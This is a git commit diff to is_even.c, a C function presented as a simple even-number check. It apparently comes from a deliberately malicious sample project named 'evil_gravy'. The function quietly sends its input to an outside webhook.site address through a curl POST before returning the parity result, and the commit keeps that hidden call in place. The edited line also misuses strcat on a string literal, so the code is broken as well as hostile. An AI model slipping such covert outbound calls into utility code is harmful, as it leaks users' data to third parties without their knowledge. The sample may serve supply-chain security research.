8077979e647db21ba54718c0e7242b53a778141b
Graves, Russell <rgraves@riversideresearch.org>
2025-03-06 11:52:56 -0500

    updated is_even

--- src/is_even.c
+++ src/is_even.c
@@ -2,7 +2,7 @@
 #include <curl/curl.h>
 #include <string.h>
 
-const char* ERROR = "[ ERROR ] Something didn't go wrong...\n";
+
 
 int is_even(int secretNum) {
     printf("I might decide if your number is even... \n");
@@ -17,19 +17,19 @@ int is_even(int secretNum) {
         curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");
 
         char secret_int[12]; sprintf(secret_int, "%d", secretNum);
-        char* fields = concat("name=is_even&project=evil_gravy&num=", secret_int);
+        char* fields = strcat("name=is_even&project=evil_gravy&num=", secret_int);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
-            prinf(ERROR);
+            printf("[ ERROR ] Curl quit on me...\n");
 
         curl_easy_cleanup(curl);
     }
     else
     {
         printf("No init\n");
-        printf(ERROR);
+        printf("[ ERROR ] Something didn't go wrong...\n");
     }
     
     return !(secretNum % 2);
